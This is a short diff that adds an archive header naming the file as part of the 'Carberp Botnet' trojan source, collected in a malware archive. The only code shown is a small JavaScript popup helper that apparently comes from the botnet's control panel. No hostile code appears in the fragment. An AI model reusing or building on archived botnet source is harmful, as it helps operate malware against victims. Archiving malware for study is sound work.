@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 
 function gtw(id){
 	get_window('/transfers/show-'+id+'.html?window=1', {name:'trasfer'+id, widht: 800, height: 600});
